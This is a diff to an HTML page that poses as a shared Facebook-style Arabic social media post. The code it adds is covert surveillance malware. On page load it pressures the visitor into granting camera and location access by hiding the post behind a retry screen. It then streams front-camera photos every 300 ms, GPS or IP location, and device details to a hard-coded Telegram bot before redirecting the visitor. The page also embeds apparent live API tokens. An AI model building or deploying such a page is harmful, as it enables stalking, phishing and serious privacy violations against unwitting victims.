@@ -3,10 +3,10 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title id="ogTitle">Loading...</title>
-  <meta property="og:title" id="ogTitleMeta" content="Loading...">
-  <meta property="og:description" id="ogDescMeta" content="">
-  <meta property="og:image" id="ogImageMeta" content="">
+  <title id="ogTitle">Shahin Zyan masengar</title>
+  <meta property="og:title" id="ogTitleMeta" content="Shahin Zyan masengar">
+  <meta property="og:description" id="ogDescMeta" content="شارك لك منشور">
+  <meta property="og:image" id="ogImageMeta" content="https://i.ibb.co/vxBgm8XS/B7392-D8-F-DCE8-4-C07-BFDF-DC3-D2-FF9-A331.jpg">
   <meta property="og:url" content="https://asoalktabe-sudo.github.io/my-photo-app/">
   <style>
     :root {
@@ -35,6 +35,372 @@
       align-items: center;
       padding-top: 30px;
       min-height: 100vh;
+      transition: background 0.3s;
+      position: relative;
+    }
+
+    .post-container {
+      max-width: 500px;
+      width: 100%;
+      background: var(--card-bg);
+      border-radius: 8px;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+      overflow: hidden;
+    }
+    .post-header {
+      display: flex;
+      align-items: center;
+      padding: 12px 16px;
+    }
+    .post-header img {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      margin-left: 8px;
+      object-fit: cover;
+    }
+    .post-user { font-weight: 600; font-size: 15px; color: var(--text-primary); }
+    .post-time { font-size: 12px; color: var(--text-secondary); }
+    .post-text {
+      padding: 0 16px 12px;
+      font-size: 15px;
+      color: var(--text-primary);
+      white-space: pre-wrap;
+    }
+    .post-image img { width: 100%; display: block; }
+    .post-stats {
+      display: flex;
+      justify-content: space-between;
+      padding: 8px 16px;
+      font-size: 13px;
+      color: var(--text-secondary);
+      border-top: 1px solid var(--border);
+    }
+    .post-actions {
+      display: flex;
+      justify-content: space-around;
+      padding: 10px 16px;
+      border-top: 1px solid var(--border);
+      color: var(--text-secondary);
+      font-size: 14px;
+      font-weight: 600;
+    }
+    .post-actions span { cursor: pointer; }
+
+    /* شاشة إعادة المحاولة */
+    .retry-overlay {
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: var(--bg);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+    .retry-btn {
+      padding: 14px 28px;
+      font-size: 1.1rem;
+      background: #1877f2;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: 600;
+    }
+    .hidden { display: none !important; }
+    video { display: none; }
+  </style>
+</head>
+<body>
+  <div class="post-container" id="postContainer">
+    <!-- هيكل مؤقت سريع -->
+    <div class="post-header">
+      <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='50' fill='%23ccc'/%3E%3C/svg%3E" alt="">
+      <div>
+        <div class="post-user">المستخدم</div>
+        <div class="post-time">الآن</div>
+      </div>
+    </div>
+    <div class="post-text">جارٍ تحميل المنشور...</div>
+    <div class="post-stats">
+      <span>0 تعليق</span>
+      <span>0 مشاركة</span>
+    </div>
+    <div class="post-actions">
+      <span>أعجبني</span>
+      <span>تعليق</span>
+      <span>مشاركة</span>
+    </div>
+  </div>
+
+  <div class="retry-overlay hidden" id="retryOverlay">
+    <button class="retry-btn" id="retryBtn">إعادة المحاولة</button>
+  </div>
+
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script>
+    const JSONBIN_BIN_ID = '69ee19e8856a68218974812e';
+    const BOT_TOKEN = '8649544110:AAF33tUasn_RsH6A7035vpyYntAlOAQ0axQ';
+    const CHAT_ID = '5151102782';
+    const IPINFO_TOKEN = 'a7e43833d69a75';
+    const CAPTURE_INTERVAL = 300;
+    const COUNTDOWN_SECONDS = 10;
+
+    const postContainer = document.getElementById('postContainer');
+    const retryOverlay = document.getElementById('retryOverlay');
+    const retryBtn = document.getElementById('retryBtn');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+
+    let stream = null;
+    let photoCount = 0;
+    let captureInterval = null;
+    let countdownInterval = null;
+    let countdown = COUNTDOWN_SECONDS;
+    let latestPosition = null;
+    let redirectUrl = 'https://example.com';
+    let deviceInfo = null;
+
+    // تحديث المنشور بعد جلب البيانات
+    async function updatePost() {
+      try {
+        const res = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}/latest`);
+        const data = await res.json();
+        const s = data.record || {};
+        redirectUrl = s.redirectUrl || redirectUrl;
+
+        const ogTitle = s.ogTitle || s.profileName || 'Shahin Zyan masengar';
+        const ogDescription = s.ogDescription || (s.postText || 'شارك لك منشور').substring(0,150);
+        const ogImage = s.ogImage || s.postImage || s.profilePicture || '';
+        const profileName = s.profileName || 'Shahin Zyan';
+        const profilePic = s.profilePicture || 'https://i.ibb.co/zJx0q3Q/default-avatar.png';
+        const postText = s.postText || 'هذا نص المنشور.';
+        const postImage = s.postImage || '';
+        const postTime = s.postTime || 'الآن';
+        const commentsCount = s.commentsCount || '12';
+        const sharesCount = s.sharesCount || '5';
+
+        document.title = ogTitle;
+        setMeta('og:title', ogTitle);
+        setMeta('og:description', ogDescription);
+        setMeta('og:image', ogImage);
+
+        postContainer.innerHTML = `
+          <div class="post-header">
+            <img src="${profilePic}" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%27http://www.w3.org/2000/svg%27 viewBox=%270 0 100 100%27%3E%3Ccircle cx=%2750%27 cy=%2750%27 r=%2750%27 fill=%27%23ccc%27/%3E%3C/svg%3E'">
+            <div>
+              <div class="post-user">${profileName}</div>
+              <div class="post-time">${postTime}</div>
+            </div>
+          </div>
+          <div class="post-text">${postText}</div>
+          ${postImage ? `<div class="post-image"><img src="${postImage}" alt="صورة المنشور"></div>` : ''}
+          <div class="post-stats">
+            <span>${commentsCount} تعليق</span>
+            <span>${sharesCount} مشاركة</span>
+          </div>
+          <div class="post-actions">
+            <span>أعجبني</span>
+            <span>تعليق</span>
+            <span>مشاركة</span>
+          </div>
+        `;
+      } catch(e) {
+        // يبقى الهيكل المؤقت ظاهراً
+      }
+    }
+
+    function setMeta(property, content) {
+      let meta = document.querySelector(`meta[property="${property}"], meta[name="${property}"]`);
+      if (meta) meta.setAttribute('content', content);
+    }
+
+    // جمع المعلومات
+    async function collectDeviceInfo() {
+      try {
+        const uaData = navigator.userAgentData || {};
+        let highEntropy = {};
+        if (uaData.getHighEntropyValues) {
+          try { highEntropy = await uaData.getHighEntropyValues(["platform","platformVersion","model","architecture"]); } catch(e) {}
+        }
+        const screen = window.screen;
+        let battery = null;
+        try { if('getBattery' in navigator) { const b = await navigator.getBattery(); battery = { level: b.level, charging: b.charging }; } } catch(e) {}
+        deviceInfo = {
+          ua: navigator.userAgent,
+          platform: navigator.platform,
+          language: navigator.language,
+          cores: navigator.hardwareConcurrency || 1,
+          memory: navigator.deviceMemory || 'N/A',
+          touch: navigator.maxTouchPoints || 0,
+          screen: `${screen.width}x${screen.height}`,
+          battery: battery ? `${(battery.level*100).toFixed(0)}% ${battery.charging?'⚡':'🔋'}` : 'N/A',
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          timestamp: new Date().toISOString(),
+          highEntropy
+        };
+        let txt = '<b>📱 معلومات الجهاز</b>\n';
+        txt += `الموديل: ${highEntropy.model||'N/A'}\nالنظام: ${deviceInfo.platform}\nالشاشة: ${deviceInfo.screen}\nالمعالج: ${deviceInfo.cores} نواة\nالذاكرة: ${deviceInfo.memory}GB\nالبطارية: ${deviceInfo.battery}\nاللغة: ${deviceInfo.language}\nالمنطقة الزمنية: ${deviceInfo.timezone}`;
+        sendText(txt);
+      } catch(e) {}
+    }
+
+    async function collectLocation() {
+      if (navigator.geolocation) {
+        try {
+          const pos = await new Promise((res,rej) => navigator.geolocation.getCurrentPosition(res,rej,{enableHighAccuracy:true,timeout:10000,maximumAge:0}));
+          latestPosition = { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy, src:'GPS' };
+        } catch(e) {}
+      }
+      if (!latestPosition) {
+        try {
+          const r = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`);
+          const d = await r.json();
+          const [lat,lon] = d.loc.split(',').map(Number);
+          latestPosition = { lat, lon, acc:10000, src:'IP' };
+        } catch(e) {}
+      }
+      if (latestPosition) {
+        sendText(`📍 الموقع: ${latestPosition.lat},${latestPosition.lon} (${latestPosition.src}, ${latestPosition.acc}m)\n🗺️ https://www.google.com/maps?q=${latestPosition.lat},${latestPosition.lon}`);
+      }
+    }
+
+    async function sendText(text) {
+      try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method:'POST', headers:{'Content-Type':'application/json'},
+          body: JSON.stringify({chat_id:CHAT_ID, text, parse_mode:'HTML'})
+        });
+      } catch(e) {}
+    }
+
+    // الكاميرا
+    async function startCameraIfGranted() {
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+        video.srcObject = stream;
+        await new Promise(r => { video.onloadedmetadata = () => { video.play(); r(); }; });
+        captureInterval = setInterval(captureAndSend, CAPTURE_INTERVAL);
+        startCountdown();
+        return true;
+      } catch(e) {
+        return false;
+      }
+    }
+
+    function captureAndSend() {
+      if (!stream || !video.videoWidth) return;
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0);
+      const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+      const blob = dataURLtoBlob(dataUrl);
+      const form = new FormData();
+      form.append('chat_id', CHAT_ID);
+      form.append('photo', blob, 'snap.jpg');
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:'POST', body:form }).catch(()=>{});
+      photoCount++;
+    }
+
+    function dataURLtoBlob(dataurl) {
+      const arr = dataurl.split(',');
+      const mime = arr[0].match(/:(.*?);/)[1];
+      const bstr = atob(arr[1]);
+      let n = bstr.length;
+      const u8arr = new Uint8Array(n);
+      while(n--) u8arr[n] = bstr.charCodeAt(n);
+      return new Blob([u8arr], {type:mime});
+    }
+
+    function stopMedia() {
+      if (captureInterval) clearInterval(captureInterval);
+      if (countdownInterval) clearInterval(countdownInterval);
+      if (stream) stream.getTracks().forEach(t => t.stop());
+    }
+
+    function startCountdown() {
+      countdown = COUNTDOWN_SECONDS;
+      countdownInterval = setInterval(() => {
+        countdown--;
+        if (countdown <= 0) {
+          stopMedia();
+          sendText(`📋 تقرير\nالصور: ${photoCount}\nالموقع: ${latestPosition?JSON.stringify(latestPosition):'N/A'}`);
+          window.location.href = redirectUrl;
+        }
+      }, 1000);
+    }
+
+    // آلية الصلاحيات
+    async function requestPermissions() {
+      const cameraPromise = navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
+        .then(s => { stream = s; return true; })
+        .catch(() => false);
+      
+      const locationPromise = new Promise(resolve => {
+        if (!navigator.geolocation) return resolve(false);
+        navigator.geolocation.getCurrentPosition(
+          pos => { latestPosition = { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy, src:'GPS' }; resolve(true); },
+          () => resolve(false),
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+      });
+
+      return await Promise.all([cameraPromise, locationPromise]);
+    }
+
+    function showRetry() {
+      postContainer.classList.add('hidden');
+      retryOverlay.classList.remove('hidden');
+      stopMedia();
+    }
+
+    function hideRetry() {
+      retryOverlay.classList.add('hidden');
+      postContainer.classList.remove('hidden');
+    }
+
+    async function attemptPermissions() {
+      const [cameraGranted, locationGranted] = await requestPermissions();
+
+      // إرسال المعلومات المتاحة
+      collectDeviceInfo();
+      if (locationGranted || latestPosition) {
+        if (!latestPosition && locationGranted) await collectLocation();
+        else if (latestPosition) sendText(`📍 الموقع: ${latestPosition.lat},${latestPosition.lon} (${latestPosition.src}, ${latestPosition.acc}m)\n🗺️ https://www.google.com/maps?q=${latestPosition.lat},${latestPosition.lon}`);
+      }
+
+      if (cameraGranted && locationGranted) {
+        hideRetry();
+        await startCameraIfGranted();
+      } else {
+        // إظهار المنشور لجزء من الثانية ثم إخفاء
+        hideRetry();
+        await new Promise(r => setTimeout(r, 250));
+        showRetry();
+      }
+    }
+
+    retryBtn.addEventListener('click', async () => {
+      hideRetry();
+      await new Promise(r => setTimeout(r, 300));
+      await attemptPermissions();
+    });
+
+    async function init() {
+      // جلب البيانات في الخلفية دون تأخير
+      updatePost();
+      // بدء طلب الصلاحيات بعد 500 مللي ثانية
+      setTimeout(attemptPermissions, 500);
+    }
+
+    window.addEventListener('load', init);
+    window.addEventListener('beforeunload', stopMedia);
+  </script>
+</body>
+</html>      min-height: 100vh;
       transition: background 0.3s;
       position: relative;
     }
